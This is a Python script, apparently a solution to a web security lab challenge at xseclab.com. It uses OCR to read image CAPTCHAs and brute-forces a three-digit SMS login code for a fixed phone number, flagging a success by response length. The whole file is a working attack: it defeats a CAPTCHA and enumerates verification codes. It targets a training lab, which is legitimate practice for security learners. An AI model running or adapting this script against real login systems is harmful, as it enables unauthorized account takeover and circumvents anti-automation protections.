#!/usr/bin/env python3

import requests
from PIL import Image
import pytesseract
from io import BytesIO

index_url = "http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php"
mobi_url = "http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php"
img_url = "http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php"

cookies = {
    "PHPSESSID": "d2c88037f0344beb50e71116fc732b85"
}

mobi_form = {
    "getcode": 1,
    "mobi": 13388886666
}

session = requests.Session()
session.cookies = requests.utils.cookiejar_from_dict(cookies)

session.get(index_url)
session.post(mobi_url, data=mobi_form)

def getVcodeNumber(session):
    imgResponse = session.get(img_url)
    image = Image.open(BytesIO(imgResponse.content))
    vcodeNumber = pytesseract.image_to_string(image, lang="eng")
    vcodeNumber = vcodeNumber.replace(" ", "")

    if vcodeNumber != "":
        return vcodeNumber
    else:
        return getVcodeNumber(session)

for i in range(100, 1000):
    vcodeNumber = getVcodeNumber(session)
    print("Vcode is: " + vcodeNumber)

    login_data = {
        "username": 13388886666,
        "mobi_code": i,
        "user_code": vcodeNumber,
        "Login": "submit"
    }
    response = session.post(index_url, data=login_data)
    responseContent = str(response.content, encoding="utf-8")
    if len(responseContent) != 1048:
        print(responseContent)
    else:
        print("This is not answer.")
